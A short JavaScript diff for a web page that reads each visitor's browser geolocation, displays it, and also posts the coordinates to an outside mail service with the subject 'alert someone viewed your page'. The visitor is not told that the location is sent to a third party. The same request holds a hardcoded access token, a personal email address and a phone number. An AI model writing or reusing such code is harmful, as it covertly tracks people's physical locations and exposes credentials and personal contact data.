@@ -56,17 +56,20 @@ else{x.innerHTML="Geolocation is not supported by this browser.";}
 }
 function showPosition(position)
 {
-  axios({
-    method: 'post',
-    url: 'https://postmail.invotes.com/send',
-    data: {
+ 
+   
+    URL= 'https://postmail.invotes.com/send',
+    data= {
       access_token: "eqhitskqjijhat94ecddwtzc",
      subject: 'alert someone viewed your page',
      message: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
      email: "erict54757@gmail.com" ,
      icon_telephone:"7153799917"
     }
-  });
+    $.post(URL,data,function(status,xhr){
+      console.log(status)
+    })
+  
 x.innerHTML="Latitude: " + position.coords.latitude + 
 "<br>Longitude: " + position.coords.longitude;  
 }
